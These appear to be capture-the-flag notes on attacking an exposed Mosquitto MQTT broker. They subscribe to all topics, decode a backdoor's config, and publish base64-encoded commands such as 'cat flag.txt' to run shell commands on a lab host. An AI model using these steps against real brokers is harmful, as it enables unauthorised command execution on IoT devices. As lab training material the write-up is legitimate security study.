1883/tcp open mosquitto version 2.0.14 [mqtt]
 
metasploit search mqtt  
options  
see if needs authentication  
search internet how to exploit mqtt
 
mosquitto_sub -t '#' -h <targetIP> -v
 
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
 
cyberchef base64
 
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",  
"registered_commands":["HELP","CMD","SYS"],  
"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",  
"sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
 
mosquitto_pub -t 'yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config' -m "SEVMUA==" -h 10.10.89.187 -v  
mosquitto_pub -t 'U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub' -m "SEVMUA==" -h 10.10.89.187  
mosquitto_pub -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m "Q01ECg==" -h 10.10.89.187 -d
 
HELP = SEVMUA==  
CMD = Q01ECg==  
SYS = U1lTCg==
 
***mosquitto_pub -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m "SEVMUA==" -h 10.10.89.187*** results:  
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
 
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": ""}
   

mosquitto_pub -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=" -h 10.10.89.187 -d
 
**Request:**  
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}  
**Request base64:**  
mosquitto_pub -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=" -h 10.10.89.187 -d  
**Response:**  
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9  
**Response decoded:**  
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"**flag{18d44fc0707ac8dc8be45bb83db54013}**\n"}  
*************************************
   

Linux x64 5.4.0-105-generic
   

livingroom/speaker {"id":10328961831378976816,"gain":70}  
storage/thermostat {"id":15150723097063983865,"temperature":24.308578}  
livingroom/speaker {"id":3704111813281591816,"gain":58}  
patio/lights {"id":8566915914152281432,"color":"GREEN","status":"ON"}  
storage/thermostat {"id":10988493471549406342,"temperature":23.951761}  
kitchen/toaster {"id":15192216156730863169,"in_use":true,"temperature":153.09756,"toast_time":342}  
storage/thermostat {"id":14844779362233646038,"temperature":23.827148}  
frontdeck/camera {"id":9352909252220780943,"yaxis":23.627625,"xaxis":-150.53625,"zoom":1.242478,"movement":true}  
livingroom/speaker {"id":13192019637902199032,"gain":48}  
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==  
patio/lights {"id":17754636297544813723,"color":"BLUE","status":"ON"}  
kitchen/toaster {"id":14810746068862971187,"in_use":true,"temperature":151.70256,"toast_time":261}  
storage/thermostat {"id":15388047475579775069,"temperature":23.793081}